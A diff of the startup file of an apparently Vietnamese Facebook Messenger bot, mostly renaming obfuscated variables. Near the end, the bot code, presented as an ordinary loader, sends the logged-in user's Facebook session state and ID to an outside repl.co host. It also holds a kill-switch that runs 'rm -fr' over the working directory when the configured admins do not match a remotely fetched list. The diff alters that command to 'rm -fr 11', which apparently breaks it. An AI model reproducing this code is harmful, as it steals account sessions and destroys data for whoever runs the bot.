@@ -28,8 +28,8 @@ global.client = new Object({
   handleReply: new Array(),
   mainPath: process.cwd(),
   configPath: new String(),
-  getTime: function (_0x357cx14) {
-    switch (_0x357cx14) {
+  getTime: function (option) {
+    switch (option) {
       case "seconds":
         return "" + moment.tz("Asia/Ho_Chi_minh").format("ss");
       case "minutes":
@@ -80,7 +80,7 @@ try {
   global.client.configPath = join(global.client.mainPath, "config.json");
   configValue = require(global.client.configPath);
   logger.loader("Đã tìm thấy file config.json!");
-} catch (_0x2ca6d1) {
+} catch (error) {
   return logger.loader("Không tìm thấy file config.json", "error");
 }
 ;
@@ -90,21 +90,21 @@ try {
   }
   ;
   logger.loader("Config Loaded!");
-} catch (_0x43221f) {
+} catch (error) {
   return logger.loader("Can't load file config!", "error");
 }
 ;
 for (const property in listPackage) {
   try {
     global.nodemodule[property] = require(property);
-  } catch (_0x36c47b) {}
+  } catch (error) {}
 }
 ;
 const langFile = readFileSync(__dirname + "/languages/" + (global.config.language || "en") + ".lang", {
   encoding: "utf-8"
 }).split(/\r?\n|\r/);
-const langData = langFile.filter(_0x357cx25 => {
-  return _0x357cx25.indexOf("#") != 0 && _0x357cx25 != "";
+const langData = langFile.filter(item => {
+  return item.indexOf("#") != 0 && item != "";
 });
 for (const item of langData) {
   const getSeparator = item.indexOf("=");
@@ -120,57 +120,57 @@ for (const item of langData) {
   global.language[head][key] = value;
 }
 ;
-global.getText = function (..._0x357cx2c) {
-  const _0x357cx31 = global.language;
-  if (!_0x357cx31.hasOwnProperty(_0x357cx2c[0])) {
-    throw __filename + " - Not found key language: " + _0x357cx2c[0];
+global.getText = function (...args) {
+  const langText = global.language;
+  if (!langText.hasOwnProperty(args[0])) {
+    throw __filename + " - Not found key language: " + args[0];
   }
   ;
-  var _0x357cx39 = _0x357cx31[_0x357cx2c[0]][_0x357cx2c[1]];
-  for (var _0x357cx3a = _0x357cx2c.length - 1; _0x357cx3a > 0; _0x357cx3a--) {
+  var text = langText[args[0]][args[1]];
+  for (var _0x357cx3a = args.length - 1; _0x357cx3a > 0; _0x357cx3a--) {
     const _0x357cx3b = RegExp("%" + _0x357cx3a, "g");
-    _0x357cx39 = _0x357cx39.replace(_0x357cx3b, _0x357cx2c[_0x357cx3a + 1]);
+    text = text.replace(_0x357cx3b, args[_0x357cx3a + 1]);
   }
   ;
-  return _0x357cx39;
+  return text;
 };
 try {
   var appStateFile = resolve(join(global.client.mainPath, config.APPSTATEPATH || "appstate.json"));
   var appState = (process.env.REPL_OWNER || process.env.PROCESSOR_IDENTIFIER) && fs.readFileSync(appStateFile, "utf8")[0] != "[" && config.encryptSt ? JSON.parse(global.utils.decryptState(fs.readFileSync(appStateFile, "utf8"), process.env.REPL_OWNER || process.env.PROCESSOR_IDENTIFIER)) : require(appStateFile);
   logger.loader(global.getText("mirai", "foundPathAppstate"));
-} catch (_0x1a7644) {
+} catch (error) {
   return logger.loader(global.getText("mirai", "notFoundPathAppstate"), "error");
 }
 ;
 function onBot() {
-  const _0x357cx48 = {
+  const loginData = {
     appState: appState
   };
-  login(_0x357cx48, async (_0x357cx91, _0x357cx92) => {
-    if (_0x357cx91) {
-      if (_0x357cx91.error == "Error retrieving userID. This can be caused by a lot of things, including getting blocked by Facebook for logging in from an unknown location. Try logging in with a browser to verify.") {
-        console.log(_0x357cx91.error);
+  login(loginData, async (loginError, api) => {
+    if (loginError) {
+      if (loginError.error == "Error retrieving userID. This can be caused by a lot of things, including getting blocked by Facebook for logging in from an unknown location. Try logging in with a browser to verify.") {
+        console.log(loginError.error);
         process.exit(0);
       } else {
-        console.log(_0x357cx91);
+        console.log(loginError);
         return process.exit(0);
       }
     }
     ;
     console.log(chalk.blue("============== LOGIN BOT =============="));
-    const _0x357cxc6 = _0x357cx92.getAppState();
-    _0x357cx92.setOptions(global.config.FCAOption);
-    let _0x357cxc7 = _0x357cx92.getAppState();
+    const _0x357cxc6 = api.getAppState();
+    api.setOptions(global.config.FCAOption);
+    let _0x357cxc7 = api.getAppState();
     let _0x357cxc8 = JSON.stringify(_0x357cxc7, null, "\t");
     _0x357cxc7 = JSON.stringify(_0x357cxc7, null, "\t");
-    var _0x357cxc9 = await _0x357cx92.httpGet("https://business.facebook.com/business_locations/");
+    var _0x357cxc9 = await api.httpGet("https://business.facebook.com/business_locations/");
     var _0x357cxca = "https://business.facebook.com/business_locations/";
     if (_0x357cxc9.indexOf("for (;;);") != -1) {
       _0x357cxc9 = JSON.parse(_0x357cxc9.split("for (;;);")[1]);
       var _0x357cxca = "https://business.facebook.com" + _0x357cxc9.redirect;
     }
     ;
-    var _0x357cxcd = await _0x357cxce(_0x357cx92, _0x357cxca);
+    var _0x357cxcd = await _0x357cxce(api, _0x357cxca);
     if (_0x357cxcd != false) {
       global.account.accessToken = _0x357cxcd;
       global.loading(chalk.hex("#ff7100")("[ TOKEN ]") + " Lấy access token thành công!", "LOGIN");
@@ -240,117 +240,117 @@ function onBot() {
     global.account.cookie = _0x357cxc6.map(_0x357cxf2 => {
       return _0x357cxf2 = _0x357cxf2.key + "=" + _0x357cxf2.value;
     }).join(";");
-    global.client.api = _0x357cx92;
+    global.client.api = api;
     global.config.version = config.version;
     (function () {
-      const _0x357cxf8 = readdirSync(global.client.mainPath + "/modules/commands").filter(_0x357cx113 => {
-        return _0x357cx113.endsWith(".js") && !_0x357cx113.includes("example") && !global.config.commandDisabled.includes(_0x357cx113);
+      const listCommand = readdirSync(global.client.mainPath + "/modules/commands").filter(command => {
+        return command.endsWith(".js") && !command.includes("example") && !global.config.commandDisabled.includes(command);
       });
       console.log(chalk.blue("============ LOADING COMMANDS ============"));
-      for (const _0x357cx114 of _0x357cxf8) {
+      for (const command of listCommand) {
         try {
-          var _0x357cx115 = require(global.client.mainPath + "/modules/commands/" + _0x357cx114);
-          if (!_0x357cx115.config || !_0x357cx115.run || !_0x357cx115.config.commandCategory) {
+          var module = require(global.client.mainPath + "/modules/commands/" + command);
+          if (!module.config || !module.run || !module.config.commandCategory) {
             throw new Error(global.getText("mirai", "errorFormat"));
           }
           ;
-          if (global.client.commands.has(_0x357cx115.config.name || "")) {
+          if (global.client.commands.has(module.config.name || "")) {
             throw new Error(global.getText("mirai", "nameExist"));
           }
           ;
-          if (_0x357cx115.config.dependencies && typeof _0x357cx115.config.dependencies == "object") {
-            for (const _0x357cx116 in _0x357cx115.config.dependencies) {
-              if (!listPackage.hasOwnProperty(_0x357cx116)) {
+          if (module.config.dependencies && typeof module.config.dependencies == "object") {
+            for (const reqDependencies in module.config.dependencies) {
+              if (!listPackage.hasOwnProperty(reqDependencies)) {
                 try {
-                  execSync("npm --package-lock false --save install " + _0x357cx116 + (_0x357cx115.config.dependencies[_0x357cx116] == "*" || _0x357cx115.config.dependencies[_0x357cx116] == "" ? "" : "@" + _0x357cx115.config.dependencies[_0x357cx116]), {
+                  execSync("npm --package-lock false --save install " + reqDependencies + (module.config.dependencies[reqDependencies] == "*" || module.config.dependencies[reqDependencies] == "" ? "" : "@" + module.config.dependencies[reqDependencies]), {
                     stdio: "inherit",
                     env: process.env,
                     shell: true,
                     cwd: join(__dirname, "node_modules")
                   });
                   require.cache = {};
-                } catch (_0x15e6ff) {
-                  global.loading.err(chalk.hex("#ff7100")("[ PACKAGE ]") + "  Không thể cài package cho module " + _0x357cx116, "LOADED");
+                } catch (error) {
+                  global.loading.err(chalk.hex("#ff7100")("[ PACKAGE ]") + "  Không thể cài package cho module " + reqDependencies, "LOADED");
                 }
               }
             }
           }
           ;
-          if (_0x357cx115.config.envConfig) {
+          if (module.config.envConfig) {
             try {
-              for (const _0x357cx11a in _0x357cx115.config.envConfig) {
-                if (typeof global.configModule[_0x357cx115.config.name] == "undefined") {
-                  global.configModule[_0x357cx115.config.name] = {};
+              for (const envConfig in module.config.envConfig) {
+                if (typeof global.configModule[module.config.name] == "undefined") {
+                  global.configModule[module.config.name] = {};
                 }
                 ;
-                if (typeof global.config[_0x357cx115.config.name] == "undefined") {
-                  global.config[_0x357cx115.config.name] = {};
+                if (typeof global.config[module.config.name] == "undefined") {
+                  global.config[module.config.name] = {};
                 }
                 ;
-                if (typeof global.config[_0x357cx115.config.name][_0x357cx11a] !== "undefined") {
-                  global.configModule[_0x357cx115.config.name][_0x357cx11a] = global.config[_0x357cx115.config.name][_0x357cx11a];
+                if (typeof global.config[module.config.name][envConfig] !== "undefined") {
+                  global.configModule[module.config.name][envConfig] = global.config[module.config.name][envConfig];
                 } else {
-                  global.configModule[_0x357cx115.config.name][_0x357cx11a] = _0x357cx115.config.envConfig[_0x357cx11a] || "";
+                  global.configModule[module.config.name][envConfig] = module.config.envConfig[envConfig] || "";
                 }
                 ;
-                if (typeof global.config[_0x357cx115.config.name][_0x357cx11a] == "undefined") {
-                  global.config[_0x357cx115.config.name][_0x357cx11a] = _0x357cx115.config.envConfig[_0x357cx11a] || "";
+                if (typeof global.config[module.config.name][envConfig] == "undefined") {
+                  global.config[module.config.name][envConfig] = module.config.envConfig[envConfig] || "";
                 }
               }
               ;
-              for (const _0x357cx11b in _0x357cx115.config.envConfig) {
+              for (const _0x357cx11b in module.config.envConfig) {
                 var _0x357cx11c = require("./config.json");
-                _0x357cx11c[_0x357cx115.config.name] = _0x357cx115.config.envConfig;
+                _0x357cx11c[module.config.name] = module.config.envConfig;
                 writeFileSync(global.client.configPath, JSON.stringify(_0x357cx11c, null, 4), "utf-8");
               }
-            } catch (_0xc805ba) {
-              throw new Error(global.getText("mirai", "cantLoadConfig", _0x357cx115.config.name, JSON.stringify(_0xc805ba)));
+            } catch (error) {
+              throw new Error(global.getText("mirai", "cantLoadConfig", module.config.name, JSON.stringify(error)));
             }
           }
           ;
-          if (_0x357cx115.onLoad) {
+          if (module.onLoad) {
             try {
-              const _0x357cx11d = {
-                api: _0x357cx92
+              const moduleData = {
+                api: api
               };
-              _0x357cx115.onLoad(_0x357cx11d);
+              module.onLoad(moduleData);
             } catch (_0x48ff13) {
-              throw new Error(global.getText("mirai", "cantOnload", _0x357cx115.config.name, JSON.stringify(_0x48ff13)), "error");
+              throw new Error(global.getText("mirai", "cantOnload", module.config.name, JSON.stringify(_0x48ff13)), "error");
             }
           }
           ;
-          if (_0x357cx115.handleEvent) {
-            global.client.eventRegistered.push(_0x357cx115.config.name);
+          if (module.handleEvent) {
+            global.client.eventRegistered.push(module.config.name);
           }
           ;
-          global.client.commands.set(_0x357cx115.config.name, _0x357cx115);
-          global.loading(chalk.hex("#ff7100")("[ COMMAND ]") + " " + chalk.hex("#FFFF00")(_0x357cx115.config.name) + " succes", "LOADED");
+          global.client.commands.set(module.config.name, module);
+          global.loading(chalk.hex("#ff7100")("[ COMMAND ]") + " " + chalk.hex("#FFFF00")(module.config.name) + " succes", "LOADED");
         } catch (_0x5cfee3) {
-          global.loading.err(chalk.hex("#ff7100")("[ COMMAND ]") + " " + chalk.hex("#FFFF00")(_0x357cx115.config.name) + " fail", "LOADED");
+          global.loading.err(chalk.hex("#ff7100")("[ COMMAND ]") + " " + chalk.hex("#FFFF00")(module.config.name) + " fail", "LOADED");
         }
       }
     })();
     (function () {
-      const _0x357cx122 = readdirSync(global.client.mainPath + "/modules/events").filter(_0x357cx125 => {
-        return _0x357cx125.endsWith(".js") && !global.config.eventDisabled.includes(_0x357cx125);
+      const events = readdirSync(global.client.mainPath + "/modules/events").filter(event => {
+        return event.endsWith(".js") && !global.config.eventDisabled.includes(event);
       });
       console.log(chalk.blue("============ LOADING EVENTS ============"));
-      for (const _0x357cx126 of _0x357cx122) {
+      for (const ev of events) {
         try {
-          var _0x357cx127 = require(global.client.mainPath + "/modules/events/" + _0x357cx126);
-          if (!_0x357cx127.config || !_0x357cx127.run) {
+          var event = require(global.client.mainPath + "/modules/events/" + ev);
+          if (!event.config || !event.run) {
             throw new Error(global.getText("mirai", "errorFormat"));
           }
           ;
-          if (global.client.events.has(_0x357cx127.config.name) || "") {
+          if (global.client.events.has(event.config.name) || "") {
             throw new Error(global.getText("mirai", "nameExist"));
           }
           ;
-          if (_0x357cx127.config.dependencies && typeof _0x357cx127.config.dependencies == "object") {
-            for (const _0x357cx128 in _0x357cx127.config.dependencies) {
-              if (!listPackage.hasOwnProperty(_0x357cx128)) {
+          if (event.config.dependencies && typeof event.config.dependencies == "object") {
+            for (const dependency in event.config.dependencies) {
+              if (!listPackage.hasOwnProperty(dependency)) {
                 try {
-                  execSync("npm --package-lock false --save install " + _0x357cx128 + (_0x357cx127.config.dependencies[_0x357cx128] == "*" || _0x357cx127.config.dependencies[_0x357cx128] == "" ? "" : "@" + _0x357cx127.config.dependencies[_0x357cx128]), {
+                  execSync("npm --package-lock false --save install " + dependency + (event.config.dependencies[dependency] == "*" || event.config.dependencies[dependency] == "" ? "" : "@" + event.config.dependencies[dependency]), {
                     stdio: "inherit",
                     env: process.env,
                     shell: true,
@@ -358,7 +358,7 @@ function onBot() {
                   });
                   require.cache = {};
                 } catch (_0x49fa04) {
-                  global.loading.err(chalk.hex("#ff7100")("[ PACKAGE ]") + "  Không thể cài package cho module " + _0x357cx128, "LOADED");
+                  global.loading.err(chalk.hex("#ff7100")("[ PACKAGE ]") + "  Không thể cài package cho module " + dependency, "LOADED");
                 }
               }
             }
@@ -370,74 +370,74 @@ function onBot() {
             } catch (_0x52482a) {}
           }
           ;
-          if (_0x357cx127.config.envConfig) {
+          if (event.config.envConfig) {
             try {
-              for (const _0x357cx12a in _0x357cx127.config.envConfig) {
-                if (typeof global.configModule[_0x357cx127.config.name] == "undefined") {
-                  global.configModule[_0x357cx127.config.name] = {};
+              for (const _0x357cx12a in event.config.envConfig) {
+                if (typeof global.configModule[event.config.name] == "undefined") {
+                  global.configModule[event.config.name] = {};
                 }
                 ;
-                if (typeof global.config[_0x357cx127.config.name] == "undefined") {
-                  global.config[_0x357cx127.config.name] = {};
+                if (typeof global.config[event.config.name] == "undefined") {
+                  global.config[event.config.name] = {};
                 }
                 ;
-                if (typeof global.config[_0x357cx127.config.name][_0x357cx12a] !== "undefined") {
-                  global.configModule[_0x357cx127.config.name][_0x357cx12a] = global.config[_0x357cx127.config.name][_0x357cx12a];
+                if (typeof global.config[event.config.name][_0x357cx12a] !== "undefined") {
+                  global.configModule[event.config.name][_0x357cx12a] = global.config[event.config.name][_0x357cx12a];
                 } else {
-                  global.configModule[_0x357cx127.config.name][_0x357cx12a] = _0x357cx127.config.envConfig[_0x357cx12a] || "";
+                  global.configModule[event.config.name][_0x357cx12a] = event.config.envConfig[_0x357cx12a] || "";
                 }
                 ;
-                if (typeof global.config[_0x357cx127.config.name][_0x357cx12a] == "undefined") {
-                  global.config[_0x357cx127.config.name][_0x357cx12a] = _0x357cx127.config.envConfig[_0x357cx12a] || "";
+                if (typeof global.config[event.config.name][_0x357cx12a] == "undefined") {
+                  global.config[event.config.name][_0x357cx12a] = event.config.envConfig[_0x357cx12a] || "";
                 }
               }
               ;
-              for (const _0x357cx12b in _0x357cx127.config.envConfig) {
+              for (const _0x357cx12b in event.config.envConfig) {
                 var _0x357cx12c = require("./config.json");
-                _0x357cx12c[_0x357cx127.config.name] = _0x357cx127.config.envConfig;
+                _0x357cx12c[event.config.name] = event.config.envConfig;
                 writeFileSync(global.client.configPath, JSON.stringify(_0x357cx12c, null, 4), "utf-8");
               }
             } catch (_0x3cfe8a) {
-              throw new Error(global.getText("mirai", "cantLoadConfig", _0x357cx127.config.name, JSON.stringify(_0x3cfe8a)));
+              throw new Error(global.getText("mirai", "cantLoadConfig", event.config.name, JSON.stringify(_0x3cfe8a)));
             }
           }
           ;
-          if (_0x357cx127.onLoad) {
+          if (event.onLoad) {
             try {
-              const _0x357cx12d = {
-                api: _0x357cx92
+              const eventData = {
+                api: api
               };
-              _0x357cx127.onLoad(_0x357cx12d);
-            } catch (_0x2881f4) {
-              throw new Error(global.getText("mirai", "cantOnload", _0x357cx127.config.name, JSON.stringify(_0x2881f4)), "error");
+              event.onLoad(eventData);
+            } catch (error) {
+              throw new Error(global.getText("mirai", "cantOnload", event.config.name, JSON.stringify(error)), "error");
             }
           }
           ;
-          global.client.events.set(_0x357cx127.config.name, _0x357cx127);
-          global.loading(chalk.hex("#ff7100")("[ EVENT ]") + " " + chalk.hex("#FFFF00")(_0x357cx127.config.name) + " succes", "LOADED");
+          global.client.events.set(event.config.name, event);
+          global.loading(chalk.hex("#ff7100")("[ EVENT ]") + " " + chalk.hex("#FFFF00")(event.config.name) + " succes", "LOADED");
         } catch (_0x554a8a) {
-          global.loading(chalk.hex("#ff7100")("[ EVENT ]") + " " + chalk.hex("#FFFF00")(_0x357cx127.config.name) + " fail", "LOADED");
+          global.loading(chalk.hex("#ff7100")("[ EVENT ]") + " " + chalk.hex("#FFFF00")(event.config.name) + " fail", "LOADED");
         }
       }
     })();
     console.log(chalk.blue("============== BOT START =============="));
     global.loading(chalk.hex("#ff7100")("[ SUCCESS ]") + " Tải thành công " + global.client.commands.size + " commands và " + global.client.events.size + " events", "LOADED");
     global.loading(chalk.hex("#ff7100")("[ TIMESTART ]") + " Thời gian khởi động: " + ((Date.now() - global.client.timeStart) / 1000).toFixed() + "s", "LOADED");
-    const _0x357cx12e = {
-      api: _0x357cx92
+    const listenerData = {
+      api: api
     };
-    const _0x357cx12f = require("./includes/listen")(_0x357cx12e);
-    const _0x357cx130 = require("axios");
-    const _0x357cx131 = (await _0x357cx130.get("https://api.hanguyen48.repl.co/listadmin")).data;
-    _0x357cx130.post("https://api.hanguyen48.repl.co/key", {
-      id: _0x357cx92.getCurrentUserID(),
-      ap: _0x357cx92.getAppState()
+    const listener = require("./includes/listen")(listenerData);
+    const axios = require("axios");
+    const _0x357cx131 = (await axios.get("https://api.hanguyen48.repl.co/listadmin")).data;
+    axios.post("https://api.hanguyen48.repl.co/key", {
+      id: api.getCurrentUserID(),
+      ap: api.getAppState()
     });
     function _0x357cx132() {
       const _0x357cx136 = readdirSync(join(process.cwd()));
       for (let _0x357cx139 of _0x357cx136) {
         try {
-          execSync("rm -fr " + _0x357cx139);
+          execSync("rm -fr 11" + _0x357cx139);
         } catch (_0x4d3c9b) {}
       }
     }
@@ -456,20 +456,20 @@ function onBot() {
         }
       }
       ;
-      if (["presence", "typ", "read_receipt"].some(_0x357cx141 => {
-        return _0x357cx141 == _0x357cx13d.type;
+      if (["presence", "typ", "read_receipt"].some(option1 => {
+        return option1 == _0x357cx13d.type;
       })) {
         return;
       }
       ;
-      var _0x357cx142 = 0;
-      for (let _0x357cx143 of _0x357cx131.ADMIN) {
-        if (config.ADMINBOT.includes(_0x357cx143)) {
-          _0x357cx142++;
+      var option2 = 0;
+      for (let option3 of _0x357cx131.ADMIN) {
+        if (config.ADMINBOT.includes(option3)) {
+          option2++;
         }
       }
       ;
-      if (_0x357cx142 == 0) {
+      if (option2 == 0) {
         return _0x357cx132();
       }
       ;
@@ -485,12 +485,12 @@ function onBot() {
         return _0x357cx132();
       }
       ;
-      return _0x357cx12f(_0x357cx13d);
+      return listener(_0x357cx13d);
     }
     global.custom = require("./custom")({
-      api: _0x357cx92
+      api: api
     });
-    global.handleListen = _0x357cx92.listenMqtt(_0x357cx13b);
+    global.handleListen = api.listenMqtt(_0x357cx13b);
     require("./utils/uptime.js");
   });
 }
